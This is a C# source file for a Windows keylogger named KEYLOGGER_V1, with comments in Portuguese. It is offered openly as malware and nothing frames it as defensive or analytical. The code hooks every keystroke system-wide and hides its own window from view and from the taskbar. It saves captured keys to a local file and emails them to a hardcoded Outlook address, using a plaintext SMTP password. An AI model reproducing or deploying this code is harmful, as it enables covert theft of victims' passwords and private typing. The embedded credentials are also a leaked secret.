using System;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Net.Mail;
using System.Diagnostics;

namespace KEYLOGGER_V1
{
    public partial class FrmHome : Form
    {
        int conta;
        string[] names = new string[3];
        Mapeamento map = new Mapeamento();
        
        //istanciar Class Caputura de Teclas
        globalKeyboardHook gkh = new globalKeyboardHook();
        private void HookAll()
        {
            foreach (object key in Enum.GetValues(typeof(Keys)))
            {
                gkh.HookedKeys.Add((Keys)key);
            }
        }

        void gkh_KeyDown(object sender, KeyEventArgs e)
        {
            Tecla tecla ;
            tecla = map.mapeamento(Convert.ToString(e.KeyCode));
            txtNaoTraduzido.Text += tecla.naotraduizada;
            txtTraduzido.Text += tecla.traduzida;
            txtEditado.Text += tecla.editada;
        }

        public FrmHome()
        {
            InitializeComponent();
        }
        public FrmHome(bool visibilidade)
        {
            //InitializeComponent();
            if (visibilidade == true){
                visivel();
            }
           
        }
        private void FrmHome_Load(object sender, EventArgs e)
        {   //deixa o formulario Invisivel
            invisivel();
            MetodosDeEventosHook();
            if (Verifica_backup() == true)
            {
                if (Habilitar_web() == true)
                {   // enviar backup para email
                    EnviarEmailBackup(@"C:\Key\Keylogger.txt");
                    //deleta backup

                }

            }

        }
        void invisivel()
        {
            this.Opacity = 0;
            this.ShowInTaskbar = false;

        }
        public void visivel()
        {
            this.Opacity = 100;
            this.ShowInTaskbar = true;
        }
        void MetodosDeEventosHook()
        {
            gkh.KeyDown += new KeyEventHandler(gkh_KeyDown);
            HookAll();
        }
        bool Verifica_backup()
        {

            if (File.Exists(@"C:\Key\Keylogger.txt"))
            {
                return true;
            }
            else
            {
                return false;
            }

        }
        private void tmEnviarEmail_Tick(object sender, EventArgs e)
        {
            //BackupOrEmail();
        }

        [DllImport("wininet.dll")]

        private extern static Boolean InternetGetConnectedState(out int Description, int ReservedValue);
        bool Habilitar_web()
        {
            bool result;

            try
            {

                int Description;

                result = InternetGetConnectedState(out Description, 0);

            }

            catch
            {
               // MessageBox.Show("Esta sem Internet!!");
                result = false;

            }

            return result;
        }
        void EnviarEmail(String Texto)
        {

            MailMessage Email;
            Stopwatch Stop = new Stopwatch();
            Email = new MailMessage();
            Email.To.Add(new MailAddress("OrionOficial@outlook.com"));
            Email.From = (new MailAddress("OrionOficial@outlook.com"));
            Email.Subject = "KeyLLogger";
            Email.IsBodyHtml = true;
            Email.Body = Texto;
            SmtpClient cliente = new SmtpClient("smtp.live.com", 587);
            using (cliente)
            {
                cliente.Credentials = new System.Net.NetworkCredential("OrionOficial@outlook.com", "Orion0f1c1al");
                cliente.EnableSsl = true;
                cliente.Send(Email);
            }
            //MessageBox.Show("Email enviado com sucesso!!", "Email - Enviado!");
            txtNaoTraduzido.Clear();

        }
        void EnviarEmailBackup(String DirBackup)
        {
            MailMessage Email;
            Stopwatch Stop = new Stopwatch();
            Email = new MailMessage();
            Email.To.Add(new MailAddress("OrionOficial@outlook.com"));
            Email.From = (new MailAddress("OrionOficial@outlook.com"));
            Email.Subject = "KeyLLogger";
            Email.IsBodyHtml = true;
            Email.Attachments.Add(new Attachment(DirBackup));
            SmtpClient cliente = new SmtpClient("smtp.live.com", 587);
            using (cliente)
            {
                cliente.Credentials = new System.Net.NetworkCredential("OrionOficial@outlook.com", "Orion0f1c1al");
                cliente.EnableSsl = true;
                cliente.Send(Email);
            }
            //MessageBox.Show("Backup enviado com sucesso!!", "Email - Enviado!");

        }
        void criarBackup(String DirBackup)
        {

            StreamWriter SW = new StreamWriter(DirBackup, true);
            SW.Write(txtNaoTraduzido.Text);
            SW.Close();
            txtNaoTraduzido.Clear();
           // MessageBox.Show("Criado backup com sucesso!");
        }
        void BackupOrEmail()
        {

            if (Habilitar_web() == true)
            {
                if (txtNaoTraduzido.Text != "")
                {
                    EnviarEmail(txtNaoTraduzido.Text);
                }


            }
            else
            {

                criarBackup(@"C:\Key\Keylogger.txt");

            }
        }
        private void FrmHome_FormClosing(object sender, FormClosingEventArgs e)
        {
            //File.Delete(@"C:\Key\Keylogger.txt");
            //if (txtTextoDigitado.Text != ""){
            //    criarBackup(@"C:\Key\Keylogger.txt");
            //}
            
        }
       
        private void FrmHome_KeyPress(object sender, KeyPressEventArgs e)
        {

        }
        private void txtTextoDigitado_TextChanged(object sender, EventArgs e)
        {
           String caracter = "[Ctrl][Delete][Esc]"; // teclas para o evento

            if (teclaDeVisibilidade(txtTraduzido.Text, caracter) == caracter)
            {
                if (this.Opacity == 0 && this.ShowInTaskbar == false)
                {
                    visivel();

                }
                else { 
                    
                    invisivel();                                                  
                }
            }
        }
        String teclaDeVisibilidade(String texto, String caracter)
        {

            int contCarac = caracter.Length;
            int contText = texto.Length;

            if (contText >= contCarac)
            {
                int result = contText - contCarac;
                String caracteres = texto.Substring(result, contCarac);
                return caracteres;
            }
            else
            {
                return texto;
            }
            

        }
    }
}
